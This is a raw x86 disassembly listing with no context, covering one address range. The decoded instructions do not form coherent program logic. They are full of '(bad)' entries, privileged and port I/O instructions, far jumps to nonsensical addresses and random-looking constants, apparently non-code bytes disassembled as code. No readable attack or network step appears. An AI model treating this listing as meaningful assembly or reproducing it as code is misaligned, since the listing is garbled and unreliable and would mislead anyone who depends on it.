  415e34:	lea    esp,[ecx+0x17]
  415e37:	or     ah,BYTE PTR [edi+0x240c7c96]
  415e3d:	jno    0x415eb0
  415e3f:	sbb    eax,0xa8a3084a
  415e44:	sbb    esp,DWORD PTR [esi]
  415e46:	xlat   BYTE PTR ds:[ebx]
  415e47:	test   DWORD PTR [ecx],esp
  415e49:	jnp    0x415e4b
  415e4b:	sub    ah,BYTE PTR [ebp+0x7d922f9d]
  415e51:	in     eax,dx
  415e52:	and    bh,al
  415e54:	test   eax,0x6b9a25f2
  415e59:	or     eax,0x2fefcfde
  415e5e:	mov    esp,0xd8483540
  415e63:	sub    eax,0xfffffff6
  415e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e67:	push   cs
  415e68:	inc    esp
  415e69:	loop   0x415df6
  415e6b:	clc    
  415e6c:	sbb    bl,BYTE PTR cs:[ecx+0x53f483b6]
  415e73:	push   es
  415e74:	arpl   WORD PTR cs:[ebx],ax
  415e77:	push   esp
  415e78:	xlat   BYTE PTR ds:[ebx]
  415e79:	aaa    
  415e7a:	jle    0x415e25
  415e7c:	push   0x4c8a2643
  415e81:	pop    eax
  415e82:	aad    0x1f
  415e84:	and    esi,esp
  415e86:	pusha  
  415e87:	jg     0x415eec
  415e89:	push   ebp
  415e8a:	adc    esp,ebp
  415e8c:	dec    eax
  415e8d:	add    BYTE PTR ds:[edi+0x14b4e0f9],bh
  415e94:	adc    al,0x69
  415e96:	rcr    DWORD PTR ds:0x42e41801,cl
  415e9c:	mov    edi,0xb986b20a
  415ea1:	or     ah,ch
  415ea3:	dec    ebx
  415ea4:	out    0x5a,eax
  415ea6:	dec    eax
  415ea7:	add    eax,0x2a049e2f
  415eac:	add    al,ah
  415eae:	dec    ebx
  415eaf:	jl     0x415ee2
  415eb1:	cmp    dh,BYTE PTR [edi-0x13d3fae5]
  415eb7:	sbb    ebx,eax
  415eb9:	enter  0xfc64,0x28
  415ebd:	ret    0xb72e
  415ec0:	call   0x1af67518
  415ec5:	inc    edi
  415ec6:	lods   eax,DWORD PTR ds:[esi]
  415ec7:	push   0xffffff99
  415ec9:	xchg   ecx,eax
  415eca:	cmp    dh,BYTE PTR [edx+0x15]
  415ecd:	lock xchg esi,eax
  415ecf:	mov    al,ds:0xbebfe5ef
  415ed4:	push   eax
  415ed5:	sbb    esi,ecx
  415ed7:	mov    cl,0xb5
  415ed9:	shl    DWORD PTR [edi],cl
  415edb:	int3   
  415edc:	mov    eax,0x5790f829
  415ee1:	mov    bh,0x95
  415ee3:	mov    eax,0xc9cc032e
  415ee8:	pop    eax
  415ee9:	cs cli 
  415eeb:	fwait
  415eec:	imul   esp,edi,0xfdf275a3
  415ef2:	dec    ebx
  415ef3:	cmp    BYTE PTR [ebp-0x7ddf3ed9],0x31
  415efa:	cmp    BYTE PTR ss:[ecx+0x61],0x4b
  415eff:	dec    edi
  415f00:	pop    edi
  415f01:	pusha  
  415f02:	popf   
  415f03:	jb     0x415f65
  415f05:	std    
  415f06:	push   ds
  415f07:	test   DWORD PTR [esi-0x5b],esi
  415f0a:	test   BYTE PTR [edx+0x278b85b8],dh
  415f10:	cld    
  415f11:	mov    bl,0xef
  415f13:	adc    dl,0xc0
  415f16:	inc    edi
  415f17:	sahf   
  415f18:	dec    edx
  415f19:	xor    BYTE PTR [edx],bl
  415f1b:	sbb    ah,bl
  415f1d:	enter  0x84ef,0xd8
  415f21:	aas    
  415f22:	nop
  415f23:	jecxz  0x415f2b
  415f25:	shl    DWORD PTR [ebx+0x238c7540],0x8c
  415f2c:	mov    ds:0xbd6ee540,eax
  415f31:	push   0xdecffba3
  415f36:	push   0x2f
  415f38:	iret   
  415f39:	out    0x50,eax
  415f3b:	call   0xf202c8e8
  415f40:	retf   
  415f41:	or     eax,0xe80a9be
  415f46:	mov    bl,0x1e
  415f48:	adc    ebp,DWORD PTR [edi+0x28cb0917]
  415f4e:	sahf   
  415f4f:	xor    DWORD PTR [ebx*8-0x75d55617],0x1b
  415f57:	pop    edx
  415f58:	sub    ebx,DWORD PTR [esi]
  415f5a:	js     0x415f03
  415f5c:	adc    esi,DWORD PTR [edi+esi*2+0x736f3a07]
  415f63:	push   0xe1594349
  415f68:	jmp    0x726ece6f
  415f6d:	imul   ebp,esi,0x2e
  415f70:	jo     0x415f87
  415f72:	loope  0x415fe9
  415f74:	std    
  415f75:	fadd   DWORD PTR [ebx-0x6b]
  415f78:	dec    ebx
  415f79:	test   DWORD PTR [eax+esi*2-0x39b773e],0x40cc8a22
  415f84:	pop    edx
  415f85:	push   ds
  415f86:	xchg   BYTE PTR [edi],ch
  415f88:	(bad)  
  415f89:	aas    
  415f8a:	clc    
  415f8b:	test   eax,0xc9242ccc
  415f90:	adc    BYTE PTR [ebx],ch
  415f92:	loopne 0x41600e
  415f94:	xor    BYTE PTR [edi-0x5f],0xd
  415f98:	scas   eax,DWORD PTR es:[edi]
  415f99:	add    al,0xe6
  415f9b:	mov    ebp,0x55a0dd82
  415fa0:	hlt    
  415fa1:	xor    esi,DWORD PTR [edx+0x63bee8d4]
  415fa7:	hlt    
  415fa8:	lea    ebx,[eax+0x198cef2d]
  415fae:	push   ebx
  415faf:	pop    esi
  415fb0:	mov    ah,0xf2
  415fb2:	cwde   
  415fb3:	icebp  
  415fb4:	and    eax,0x4250660
  415fb9:	xchg   ecx,eax
  415fba:	and    cl,bh
  415fbc:	or     ecx,eax
  415fbe:	enter  0xfd9f,0x5d
  415fc2:	shr    DWORD PTR [ebx-0x69],cl
  415fc5:	push   0x3be2a7e2
  415fca:	repnz mov DWORD PTR [ecx+0x1],edi
  415fce:	addr16 push 0x9497547c
  415fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd5:	dec    esp
  415fd6:	sub    bl,BYTE PTR [ebx]
  415fd8:	rcl    dl,0x7e
  415fdb:	rcl    cl,1
  415fdd:	rcr    bh,cl
  415fdf:	jmp    0xe376:0xe177b2e4
  415fe6:	xchg   ebx,eax
  415fe7:	dec    ecx
  415fe8:	test   al,0xcf
  415fea:	jecxz  0x415fc8
  415fec:	(bad)  
  415fed:	and    eax,0x215d56d7
  415ff2:	in     eax,dx
  415ff3:	aas    
  415ff4:	in     eax,0xea
  415ff6:	pop    ebp
  415ff7:	(bad)  
  415ff8:	or     BYTE PTR [ecx+0xe4f1613],dl
  415ffe:	ds iret 
  416000:	leave  
  416001:	stos   BYTE PTR es:[edi],al
  416002:	(bad)  [ebx-0x61]
  416005:	ins    BYTE PTR es:[edi],dx
  416006:	or     eax,0x51ffb5e3
  41600b:	fld    QWORD PTR [esi-0x9]
  41600e:	rol    ebx,cl
  416010:	std    
  416011:	fild   DWORD PTR [edi+0x29060c3d]
  416017:	inc    ebx
  416018:	fwait
  416019:	in     eax,dx
  41601a:	out    dx,eax
  41601b:	push   edx
  41601c:	fcom   DWORD PTR [ebx]
  41601e:	pop    esi
  41601f:	push   0xa39a75b
  416024:	repnz fdivr DWORD PTR [esi+0x1d]
  416028:	mov    edi,0x3dd6ca32
  41602d:	ins    DWORD PTR es:[edi],dx
  41602e:	xor    DWORD PTR [ecx+eiz*4],ebp
  416031:	cld    
  416032:	inc    edi
  416033:	shl    eax,1
  416035:	mov    eax,ds:0x9287acc
  41603a:	in     eax,dx
  41603b:	pop    ss
  41603c:	(bad)  
  41603d:	dec    ecx
  41603e:	jmp    0xd003445b
  416043:	out    0x1e,al
  416045:	mov    edi,0x712b9b89
  41604a:	jmp    0xc14de5dc
  41604f:	inc    ebx
  416050:	retf   
  416051:	repnz cmp DWORD PTR [edx+edx*8],esi
  416055:	sub    BYTE PTR [ebp+0x6135e95e],0x65
  41605c:	push   esp
  41605d:	mov    esp,0x6354250
  416062:	fwait
  416063:	out    0x85,eax
  416065:	mov    BYTE PTR [esi+eiz*4],cl
  416068:	pop    esi
  416069:	out    0x6e,al
  41606b:	enter  0x9da7,0x54
  41606f:	push   es
  416070:	fcomp  QWORD PTR [ebx+edi*1]
  416073:	jmp    0x82b7dace
  416078:	push   cs
  416079:	ds mov eax,0xa6f48879
  41607f:	xchg   ebp,eax
  416080:	pop    edi
  416081:	add    bh,ah
  416083:	inc    ecx
  416084:	adc    BYTE PTR [esi+0x598731cd],ah
  41608a:	jbe    0x416102
  41608c:	pop    edi
  41608d:	aaa    
  41608e:	ins    BYTE PTR es:[edi],dx
  41608f:	aad    0x77
  416091:	rcl    DWORD PTR [ebx-0x4d],0x31
  416095:	inc    eax
  416096:	sub    ecx,DWORD PTR [ecx]
  416098:	inc    ebp
  416099:	mov    cl,0x79
  41609b:	add    dl,dl
  41609d:	jae    0x416035
  41609f:	aas    
  4160a0:	in     eax,0x3f
  4160a2:	inc    ebx
  4160a3:	push   esi
  4160a4:	push   ebx
  4160a5:	jb     0x4160cd
  4160a7:	push   0xf5524954
  4160ac:	cmp    bh,BYTE PTR [edi-0x6aecb831]
  4160b2:	push   es
  4160b3:	(bad)  
  4160b4:	cmp    edx,DWORD PTR [edx+ecx*2-0x770b8fe8]
  4160bb:	and    esi,DWORD PTR [ebp+0x22]
  4160be:	fnstcw WORD PTR [ebp+ebp*8+0x5a34de1c]
  4160c5:	in     al,0xc1
  4160c7:	ret    
  4160c8:	pop    ds
  4160c9:	jg     0x4160d1
  4160cb:	in     al,0xde
  4160cd:	rcr    BYTE PTR [eax],cl
  4160cf:	call   0x7e21:0x35cdad4b
  4160d6:	jmp    0x6d34:0x3073e16e
  4160dd:	mov    edi,0x7165c3f6
  4160e2:	enter  0xf7d8,0xe8
  4160e6:	data16 fldcw WORD PTR [esi+0x6d]
  4160ea:	pusha  
  4160eb:	cmp    al,0x45
  4160ed:	leave  
  4160ee:	or     ch,BYTE PTR [eax-0x60]
  4160f1:	into   
  4160f2:	pop    esp
  4160f3:	and    al,0xa3
  4160f5:	push   ds
  4160f6:	push   ebx
  4160f7:	dec    esp
  4160f8:	add    bl,BYTE PTR [esi+0x3d33fd76]
  4160fe:	pop    esp
  4160ff:	add    BYTE PTR [ecx-0x15],bl
  416102:	push   ecx
  416103:	push   es
  416104:	mov    ds:0xa27c75cd,al
  416109:	sti    
  41610a:	inc    edi
  41610b:	inc    esp
  41610c:	cmc    
  41610d:	fs mov ecx,0x4ed1dc2e
  416113:	leave  
  416114:	jge    0x416123
  416116:	xchg   edi,eax
  416117:	iret   
  416118:	mov    edx,DWORD PTR [eax+0xf]
  41611b:	or     DWORD PTR [edi],0xffffffac
  41611e:	jmp    0x416169
  416120:	or     esi,0x29
  416123:	pop    ebx
  416124:	rcr    ecx,0x1e
  416127:	add    eax,0x57f0abe3
  41612c:	aaa    
  41612d:	adc    BYTE PTR [edx+0x63],bl
  416130:	push   cs
  416131:	hlt    
  416132:	mov    ah,0x1
  416134:	cvtps2pd xmm3,QWORD PTR [ebx]
  416137:	aad    0xb7
  416139:	xchg   edx,eax
  41613a:	inc    esp
  41613b:	ret    0x6a34
  41613e:	push   es
  41613f:	pop    ecx
  416140:	mov    ah,0x29
  416142:	(bad)  
  416144:	inc    ecx
  416145:	fbld   TBYTE PTR [esi-0x7c5fc52e]
  41614b:	xchg   edx,eax
  41614c:	rol    al,1
  41614e:	stc    
  41614f:	mov    bl,0x57
  416151:	jno    0x4161bf
  416153:	stc    
  416154:	dec    ebx
  416155:	ins    BYTE PTR es:[edi],dx
  416156:	cmp    al,0x7b
  416158:	adc    eax,0x3e53508
  41615d:	inc    ebp
  41615e:	sbb    al,0x7d
  416160:	inc    ebx
  416161:	clc    
  416162:	cmp    al,0x72
  416164:	add    bl,BYTE PTR [esi]
  416166:	inc    ebp
  416167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416168:	mov    esp,esi
  41616a:	xchg   ebx,eax
  41616b:	and    al,0xce
  41616d:	push   edx
  41616e:	lea    ebx,[edi+0x7038f67a]
  416174:	iret   
  416175:	(bad)  
  416176:	mov    esp,0x7cf8b222
  41617b:	sub    esi,DWORD PTR [esi+eax*2]
  41617e:	icebp  
  41617f:	mov    ?,WORD PTR [ecx-0x42]
  416182:	iret   
  416183:	daa    
  416184:	xchg   esp,eax
  416185:	fnstcw WORD PTR [ebx]
  416187:	out    0x39,eax
  416189:	mov    edx,0x8827705
  41618e:	aad    0xf3
  416190:	inc    ebx
  416191:	pop    es
  416192:	daa    
  416193:	popa   
  416194:	test   DWORD PTR [ebx],eax
  416196:	and    al,0x8d
  416198:	fs pop esi
  41619a:	inc    ecx
  41619b:	popa   
  41619c:	xor    DWORD PTR [ebp+0x3f],eax
  41619f:	int3   
  4161a0:	shr    BYTE PTR [esi+0x4b],0xf5
  4161a4:	retf   
  4161a5:	cmp    ah,dl
  4161a7:	xchg   ecx,eax
  4161a8:	fsub   st(7),st
  4161aa:	call   0xa910e36b
  4161af:	push   esi
  4161b0:	lahf   
  4161b1:	jecxz  0x41613c
  4161b3:	fcmove st,st(5)
  4161b5:	hlt    
  4161b6:	imul   DWORD PTR [ebx+eiz*1]
  4161b9:	mov    eax,0x64cb1e38
  4161be:	loopne 0x4161d3
  4161c0:	sti    
  4161c1:	inc    esp
  4161c2:	dec    ecx
  4161c3:	sub    esp,DWORD PTR [edx-0x205fc054]
  4161c9:	aad    0x51
  4161cb:	ror    cl,cl
  4161cd:	xchg   esp,eax
  4161ce:	dec    esi
  4161cf:	cli    
  4161d0:	out    0x32,eax
  4161d2:	cmp    bh,BYTE PTR ds:0x671529fa
  4161d8:	(bad)  
  4161d9:	enter  0x9a9e,0x4f
  4161dd:	aas    
  4161de:	jge    0x416223
  4161e0:	pop    ss
  4161e1:	fldcw  WORD PTR [ebx-0x98362e]
  4161e7:	lods   eax,DWORD PTR ds:[esi]
  4161e8:	(bad)  
  4161e9:	jmp    0x5868:0x42c09761
  4161f0:	gs rol al,cl
  4161f3:	cmp    cl,bh
  4161f5:	hlt    
  4161f6:	add    eax,0x92a34d27
  4161fb:	cwde   
  4161fc:	pop    esi
  4161fd:	fisub  DWORD PTR [esi-0x333526c]
  416203:	xchg   edi,eax
  416204:	jp     0x41621a
  416206:	pop    ebp
  416207:	retf   
  416208:	lock xor eax,0xe2c826b5
  41620e:	sbb    al,0x67
  416210:	mov    bh,BYTE PTR [ebp-0x6dbaf817]
  416216:	aam    0xc
  416218:	inc    ecx
  416219:	ins    BYTE PTR es:[edi],dx
  41621a:	pop    ebp
  41621b:	jne    0x4161af
  41621d:	fiadd  DWORD PTR [eax+ebx*1-0xaf6b2c1]
  416224:	mov    bl,0x55
  416226:	dec    eax
  416227:	aam    0x18
  416229:	mov    fs,edx
  41622b:	add    esi,ebx
  41622d:	mov    ecx,0xfcb4e7f3
  416232:	loope  0x416299
  416234:	rol    DWORD PTR [edi],0xd1
  416237:	pop    ebx
  416238:	fidivr DWORD PTR [ecx+ebp*1]
  41623b:	cli    
  41623c:	call   0x42ed:0x63ed6d69
  416243:	dec    edx
  416244:	sbb    eax,0x772eed81
  416249:	pop    ss
  41624a:	cwde   
  41624b:	xchg   edi,eax
  41624c:	sub    al,0xb9
  41624e:	push   ds
  41624f:	dec    edi
  416250:	imul   eax,DWORD PTR [ebx],0x26
  416253:	mov    WORD PTR [ecx],ss
  416255:	dec    DWORD PTR [edx]
  416257:	mov    al,0xf3
  416259:	jp     0x4162cb
  41625b:	jmp    0x1f48b8be
  416260:	fcmovu st,st(2)
  416262:	dec    ecx
  416263:	in     eax,0x73
  416265:	push   es
  416266:	or     DWORD PTR [esi],edi
  416268:	jmp    0x41620d
  41626a:	daa    
  41626b:	aam    0x2
  41626d:	and    al,0x18
  41626f:	pop    edx
  416270:	jo     0x4162e2
  416272:	pop    edx
  416273:	ja     0x4161f6
  416275:	or     eax,0x3358da19
  41627a:	mov    ecx,0xc1a6bc89
  41627f:	lods   al,BYTE PTR es:[esi]
  416281:	loope  0x4162f9
  416283:	daa    
  416284:	dec    esi
  416285:	mov    WORD PTR [edx],ds
  416287:	aaa    
  416288:	cld    
  416289:	xor    dh,BYTE PTR [esi+edx*4-0x60895596]
  416290:	adc    edx,esi
  416292:	mov    dh,BYTE PTR [esp+eiz*8+0x5d]
  416296:	dec    esi
  416297:	adc    cl,bh
  416299:	jmp    0x4e38:0xf3c68c78
  4162a0:	xchg   edi,eax
  4162a1:	jno    0x416234
  4162a3:	bound  edi,QWORD PTR gs:[ecx]
  4162a6:	stos   BYTE PTR es:[edi],al
  4162a7:	dec    eax
  4162a8:	loop   0x41623f
  4162aa:	mov    ecx,DWORD PTR [eax]
  4162ac:	(bad)  
  4162ad:	mov    ch,BYTE PTR [ebx]
  4162af:	dec    ecx
  4162b0:	jne    0x4162a8
  4162b2:	sub    ah,BYTE PTR [ebx+0xf3b20a0]
  4162b8:	dec    esi
  4162b9:	leave  
  4162ba:	mov    cl,0x12
  4162bc:	arpl   WORD PTR [edi-0x44],ax
  4162bf:	mov    BYTE PTR [edi],cl
  4162c1:	daa    
  4162c2:	std    
  4162c3:	sub    DWORD PTR [ebp-0x5c850123],0xb8de26f1
  4162cd:	rcl    DWORD PTR [edi+esi*4+0x11dd7ce3],0xdb
  4162d5:	js     0x416341
  4162d7:	repz and al,0x6e
  4162da:	jbe    0x416278
  4162dc:	pop    edx
  4162dd:	out    0x7c,eax
  4162df:	lea    ebp,[ecx-0xb73d6e8]
  4162e5:	or     cl,BYTE PTR [ecx+0x5]
  4162e8:	call   0x9679:0x314503a1
  4162ef:	adc    al,0x51
  4162f1:	cmp    BYTE PTR [esi],dh
  4162f3:	mov    ds:0x47fced9c,eax
  4162f8:	inc    eax
  4162f9:	ins    DWORD PTR es:[edi],dx
  4162fa:	mov    edi,0xc213a504
  4162ff:	dec    ecx
  416300:	hlt    
  416301:	inc    edx
  416302:	lods   al,BYTE PTR ds:[esi]
  416303:	fistp  DWORD PTR [edi]
  416305:	ins    DWORD PTR es:[di],dx
  416307:	addr16 mov bh,0x8a
  41630a:	rcr    DWORD PTR [esp+ebx*8+0x72f15033],cl
  416311:	push   edx
  416312:	xchg   DWORD PTR [ebx+0x6b1de42b],esp
  416318:	mov    eax,0xfcc27870
  41631d:	xor    al,0xb1
  41631f:	xlat   BYTE PTR ds:[ebx]
  416320:	(bad)
  416323:	xchg   BYTE PTR [ebx+edi*4],ch
  416326:	mov    ch,0xb1
  416328:	or     eax,0x4c193313
  41632d:	sub    eax,0xc93b3df8
  416332:	mov    BYTE PTR [esi+0x77baaef],bh
  416338:	jg     0x4162e8
  41633a:	adc    BYTE PTR [eax+0x64],al
  41633d:	test   DWORD PTR [eax+0x38],edi
  416340:	lods   eax,DWORD PTR ds:[esi]
  416341:	ins    DWORD PTR es:[edi],dx
  416342:	adc    eax,0xabd5f079
  416347:	jecxz  0x416303
  416349:	sub    eax,ebp
  41634b:	xlat   BYTE PTR ds:[ebx]
  41634c:	sti    
  41634d:	sbb    al,0xd0
  41634f:	mov    bl,0x73
  416351:	sub    cl,0x1d
  416354:	mov    esi,0xabc28d5c
  416359:	fdivrp st(0),st
  41635b:	or     eax,0xf978a67b
  416360:	fwait
  416361:	or     DWORD PTR [edx-0x3f],ebx
  416364:	lods   eax,DWORD PTR ds:[esi]
  416365:	push   0xa591fe6e
  41636a:	mov    WORD PTR [ebx+edx*2+0x28],ds
  41636e:	inc    esi
  41636f:	sti    
  416370:	rol    BYTE PTR [ebp-0x46bac712],0xa4
  416377:	inc    ebx
  416378:	hlt    
  416379:	sub    ebx,DWORD PTR [ecx+eiz*2+0x16b1e0cb]
  416380:	imul   ebp,ebx,0xffffffbc
  416383:	xlat   BYTE PTR ds:[ebx]
  416384:	mov    al,gs:0xa67f6e47
  41638a:	pushf  
  41638b:	dec    edi
  41638c:	push   edi
  41638d:	add    edx,DWORD PTR [ebx+0x69]
  416390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416391:	test   al,0x9d
  416393:	adc    al,0x33
  416395:	push   eax
  416396:	jp     0x41631f
  416398:	sbb    eax,0xdefea845
  41639d:	rcl    BYTE PTR [edx+edi*8],1
  4163a0:	test   DWORD PTR [esi-0x39],eax
  4163a3:	mov    bh,0x57
  4163a5:	inc    edx
  4163a6:	jmp    FWORD PTR [edi-0xaa9852f]
  4163ac:	iret   
  4163ad:	sbb    cl,BYTE PTR [edx-0x3e]
  4163b0:	inc    ebx
  4163b1:	loope  0x416410
  4163b3:	inc    ebx
  4163b4:	popa   
  4163b5:	aad    0x78
  4163b7:	adc    dl,BYTE PTR [eax]
  4163b9:	pop    edi
  4163ba:	sbb    bh,BYTE PTR [edi]
  4163bc:	pop    edx
  4163bd:	sbb    ebp,ebx
  4163bf:	lods   eax,DWORD PTR ds:[esi]
  4163c0:	shl    DWORD PTR [edi-0x7c],1
  4163c3:	scas   al,BYTE PTR es:[edi]
  4163c4:	or     DWORD PTR gs:[edi-0x10],ebx
  4163c8:	or     eax,DWORD PTR [edi+0xb]
  4163cb:	(bad)  
  4163cc:	loop   0x416447
  4163ce:	xor    ch,0x17
  4163d1:	xchg   esp,eax
  4163d2:	pop    ss
  4163d3:	cdq    
  4163d4:	xchg   ebx,eax
  4163d5:	test   BYTE PTR [ebx+0x45de7eda],dl
  4163db:	aam    0xbb
  4163dd:	(bad)  
  4163df:	js     0x4163ce
  4163e1:	clc    
  4163e2:	and    al,0x62
  4163e4:	mov    ds:0x7263651e,eax
  4163e9:	sub    BYTE PTR [edx-0x4c],bh
  4163ec:	fistp  QWORD PTR [eax]
  4163ee:	push   0xa1fb98fd
  4163f3:	retf   0xf11b
  4163f6:	mov    BYTE PTR [esp+esi*1-0x21],bl
  4163fa:	adc    edx,ebx
  4163fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163fd:	cmp    esi,DWORD PTR [ebp-0x4f]
  416400:	push   0xffffff85
  416402:	fadd   DWORD PTR [ecx]
  416404:	jo     0x416447
  416406:	mov    ecx,0x7eb160d0
  41640b:	inc    ebp
  41640c:	leave  
  41640d:	lahf   
  41640e:	or     ecx,0xffffffc3
  416411:	jns    0x41648d
  416413:	into   
  416414:	dec    esi
  416415:	repz in eax,0xa3
  416418:	xor    al,bh
  41641a:	mov    dl,0x2
  41641c:	inc    ebp
  41641d:	xchg   ebx,eax
  41641e:	jmp    0xb4cc:0xa47ecb85
  416425:	fsubr  st(7),st
  416427:	aam    0xc2
  416429:	push   ecx
  41642a:	jne    0x41644d
  41642c:	mov    DWORD PTR [edx],ecx
  41642e:	js     0x19279ca6
  416434:	fcom   DWORD PTR [ecx+0x44]
  416437:	dec    ebx
  416438:	imul   edx,DWORD PTR [edx-0x6a],0x72b1d132
  41643f:	je     0x41646f
  416441:	mov    ecx,0x5e919cb4
  416446:	jge    0x416410
  416448:	scas   eax,DWORD PTR es:[edi]
  416449:	retf   
  41644a:	jo     0x416436
  41644c:	cld    
  41644d:	scas   eax,DWORD PTR es:[edi]
  41644e:	push   ebp
  41644f:	pop    esp
  416450:	xor    eax,0x44c96e72
  416455:	jno    0x4163e6
  416457:	leave  
  416458:	dec    DWORD PTR [si+0x6063]
  41645d:	jae    0x416469
  41645f:	(bad)  [eax-0x55]
  416462:	jg     0x4164e1
  416464:	and    al,0x54
  416466:	xchg   ecx,eax
  416467:	mov    edx,0x253fcc8e
  41646d:	sub    edx,ebx
  41646f:	outs   dx,DWORD PTR ds:[esi]
  416470:	in     eax,0x4b
  416472:	push   ebp
  416473:	jnp    0x416462
  416475:	inc    edx
  416476:	sbb    esi,DWORD PTR [bx+0x272c]
  41647b:	test   DWORD PTR [ebp+0x72c7fb8e],0x4c2be532
  416485:	and    ecx,DWORD PTR [ebx]
  416487:	inc    edx
  416488:	push   ss
  416489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41648a:	sbb    eax,0x239725ce
  41648f:	or     ebp,DWORD PTR [eax+0x5c2d0504]
  416495:	pop    ds
  416496:	jae    0x416494
  416498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416499:	lods   al,BYTE PTR ds:[esi]
  41649a:	dec    esp
  41649b:	pop    ecx
  41649c:	mov    dh,0xb3
  41649e:	fmul   QWORD PTR [esi+0x29]
  4164a1:	rol    BYTE PTR [edx+0x3a],0xc5
  4164a5:	xchg   esi,eax
  4164a6:	xor    esi,eax
  4164a8:	mov    ecx,0xbd28506
  4164ad:	xchg   edi,eax
  4164ae:	aad    0x66
  4164b0:	mov    edi,0xb8b67656
  4164b5:	fucomi st,st(6)
  4164b7:	in     eax,0x8c
  4164b9:	ret    
  4164ba:	(bad)  
  4164bb:	call   ebx
  4164bd:	sbb    DWORD PTR [ecx],edx
  4164bf:	sbb    DWORD PTR [ecx+0x48c6df45],edx
  4164c5:	jno    0x4164a7
  4164c7:	dec    ecx
  4164c8:	aaa    
  4164c9:	dec    edi
  4164ca:	mov    ecx,0x4e6a17c
  4164cf:	test   bh,cl
  4164d1:	dec    edx
  4164d2:	test   DWORD PTR [edi],0xa14b4097
  4164d8:	retf   
  4164d9:	fsub   DWORD PTR [ebx]
  4164db:	ss gs inc ebp
  4164de:	pop    ecx
  4164df:	js     0x4164cd
  4164e1:	cmc    
  4164e2:	shl    DWORD PTR [edx],1
  4164e4:	(bad)  
  4164e5:	xlat   BYTE PTR ds:[ebx]
  4164e6:	adc    BYTE PTR [esi],cl
  4164e8:	lds    esp,FWORD PTR [esi]
  4164ea:	add    dh,al
  4164ec:	inc    esi
  4164ed:	mov    esi,0xeff7d529
  4164f2:	pop    ebx
  4164f3:	pop    edx
  4164f4:	or     DWORD PTR [eax+0x44],edx
  4164f7:	jbe    0x4164c1
  4164f9:	adc    edi,DWORD PTR [edi+0x65]
  4164fc:	leave  
  4164fd:	out    0x15,eax
  4164ff:	dec    edx
  416501:	xor    DWORD PTR [edi+ebp*1+0x1c4fa984],ebp
  416508:	in     al,dx
  416509:	stos   DWORD PTR es:[edi],eax
  41650a:	mov    dl,0xf
  41650c:	or     edi,DWORD PTR ds:0xdb758026
  416512:	mov    ch,0xbf
  416514:	cdq    
  416515:	pop    edi
  416516:	dec    edx
  416517:	sbb    dh,BYTE PTR [esi-0x31]
  41651a:	cmp    edx,ecx
  41651c:	mov    edx,0x36409e66
  416521:	in     eax,dx
  416522:	aad    0xfd
  416524:	rcl    dl,cl
  416526:	mov    cl,0xbc
  416528:	scas   al,BYTE PTR es:[edi]
  416529:	mov    ebx,0x2cf1c8b7
  41652e:	test   DWORD PTR es:[edx],ecx
  416531:	cli    
  416532:	xchg   ecx,eax
  416533:	jnp    0x416571
  416535:	ins    DWORD PTR es:[edi],dx
  416536:	sbb    eax,0xfc403d50
  41653b:	jnp    0x41653b
  41653d:	inc    eax
  41653e:	invd   
  416540:	push   ebx
  416541:	stos   DWORD PTR es:[edi],eax
  416542:	mov    eax,ds:0xba8fbfc7
  416547:	sbb    eax,0x530f27dd
  41654c:	retf   0xbea1
  41654f:	cmc    
  416550:	(bad)  
  416551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416552:	test   BYTE PTR [ebp+0x8],0x2
  416556:	jmp    0xc46aa0ab
  41655b:	dec    edi
  41655c:	lock mov ah,0x59
  41655f:	fisub  WORD PTR [ebx]
  416561:	adc    DWORD PTR [eax-0xc65aaa0],edx
  416567:	das    
  416568:	outs   dx,DWORD PTR ds:[esi]
  416569:	clc    
  41656a:	daa    
  41656b:	sbb    BYTE PTR [esi+ecx*4+0x4a32532e],cl
  416572:	xchg   BYTE PTR [edi+eax*1+0x30],bl
  416576:	mov    edx,DWORD PTR ds:0x7d30f0e2
  41657c:	shl    BYTE PTR [edx-0x3db392ed],1
  416582:	dec    eax
  416583:	fsub   QWORD PTR [edx+0x2f]
  416586:	mov    dl,0xd9
  416588:	adc    edx,DWORD PTR [ebp+0x6e084405]
  41658e:	out    dx,al
  41658f:	add    ebp,esp
  416591:	jne    0x416586
  416593:	ret    
  416594:	xlat   BYTE PTR ds:[ebx]
  416595:	mov    dh,0x76
  416597:	ret    
  416598:	xor    ebp,DWORD PTR [edx]
  41659a:	jl     0x4165cd
  41659c:	rol    edi,1
  41659e:	test   al,0x79
  4165a0:	and    eax,0x581a593c
  4165a5:	gs jae 0x416612
  4165a8:	repnz add bl,cl
  4165ab:	repnz sbb edi,DWORD PTR [ebp+0x37]
  4165af:	xor    eax,0x61f8cb71
  4165b4:	test   BYTE PTR [edx-0x4f],0x26
  4165b8:	pop    ebp
  4165b9:	mov    ds:0xa7d132a8,al
  4165be:	jnp    0x416605
  4165c0:	xchg   edx,eax
  4165c1:	mov    dh,0x46
  4165c3:	push   edx
  4165c4:	mov    ch,0xb0
  4165c6:	(bad)  
  4165c8:	je     0x4165a2
  4165ca:	add    eax,0x15d0e79c
  4165cf:	xchg   ecx,eax
  4165d0:	dec    esi
  4165d1:	data16 mov ah,0x85
  4165d4:	aad    0x3e
  4165d6:	pxor   mm4,QWORD PTR [ebp-0x21ead244]
  4165dd:	push   ebp
  4165de:	sub    esp,DWORD PTR [edi]
  4165e0:	xchg   ecx,eax
  4165e1:	or     ebx,DWORD PTR [eax-0x72]
  4165e4:	inc    ebp
  4165e5:	test   BYTE PTR [ecx+0x265f2ca4],0x88
  4165ec:	mov    edx,DWORD PTR [edx+edi*2-0x15]
  4165f0:	dec    ecx
  4165f1:	je     0x4165da
  4165f3:	xor    esp,ebx
  4165f5:	dec    ebp
  4165f6:	xor    eax,0xd17d13a3
  4165fb:	push   ds
  4165fc:	sti    
  4165fd:	ficom  WORD PTR ds:0x857b5a30
  416603:	bound  ebp,QWORD PTR [edx]
  416605:	jge    0x41659b
  416607:	or     eax,0x1594ad58
  41660c:	push   ecx
  41660d:	jmp    DWORD PTR [ecx]
  41660f:	dec    ecx
  416610:	arpl   WORD PTR ds:0x5917f81a,di
  416616:	and    DWORD PTR [ebx+0x3166850d],ebx
  41661c:	jmp    0x7f1034d2
